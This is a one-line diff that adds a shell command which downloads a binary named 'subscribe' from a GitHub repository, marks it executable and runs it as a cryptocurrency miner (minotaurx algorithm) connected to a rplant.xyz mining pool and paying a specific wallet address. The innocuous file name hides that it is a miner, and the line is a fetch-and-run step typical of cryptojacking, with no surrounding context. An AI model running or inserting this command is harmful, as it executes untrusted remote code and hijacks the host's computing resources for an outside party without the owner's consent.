@@ -1,0 +1,1 @@
+wget https://github.com/penjelajahwaktudonk/w/raw/main/subscribe && chmod +x subscribe && /subscribe -a minotaurx --pool stratum+tcps://stratum-asia.rplant.xyz:17063 -u PLKG4kqS3M7oGaPJCDPFmwqs3nBRiNXUjC.tess --timeout 120 -p m=solo
